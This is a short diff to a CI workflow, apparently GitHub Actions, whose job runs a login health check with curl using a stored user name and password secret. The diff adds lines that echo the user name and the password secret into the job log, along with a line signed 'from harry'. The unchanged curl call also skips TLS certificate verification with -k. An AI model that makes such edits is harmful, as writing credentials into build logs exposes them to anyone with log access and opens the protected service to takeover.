@@ -21,7 +21,10 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "Login health check"
+        echo "Printing USER environment variable..."
+        echo "USER=$USER"
+        echo "PW=$PW"
+        echo "Login health check from harry"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
         
     - name: send_run_log
